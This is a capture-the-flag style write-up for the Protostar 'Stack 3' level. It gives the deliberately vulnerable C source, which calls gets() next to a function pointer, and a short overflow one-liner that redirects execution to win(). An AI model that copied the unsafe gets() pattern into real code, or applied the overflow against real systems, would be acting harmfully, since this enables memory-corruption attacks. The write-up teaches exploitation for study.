# Stack 3

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints:
- both gdb and `objdump` are your friends to determine where the `win()` function lies in memory.

This level is at `/opt/protostar/bin/stack3`

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Solution

We can use `nm` to determine the address of the `win()` function:

```console
user@protostar:/opt/protostar/bin$ nm stack3 | grep win
08048424 T win
```

Now we just have to call the function at the address `0x08048424`:

```console
user@protostar:/opt/protostar/bin$ python -c "print('A' * 64 + '\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
